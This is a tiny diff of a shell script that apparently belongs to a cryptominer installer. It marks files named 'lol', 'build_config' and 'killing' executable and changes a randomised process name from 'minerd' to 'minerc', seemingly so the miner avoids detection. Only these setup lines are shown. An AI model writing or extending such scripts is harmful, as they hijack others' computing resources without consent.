@@ -1,5 +1,5 @@
 chmod +x lol build_config killing
-TOP=minerd.$(shuf -n 1 -i 1-999999)
+TOP=minerc.$(shuf -n 1 -i 1-999999)
 OKE=$(shuf -n 1 -i 1-99)
 cpu=$(shuf -n 1 -i 1-20)
 USER=$1
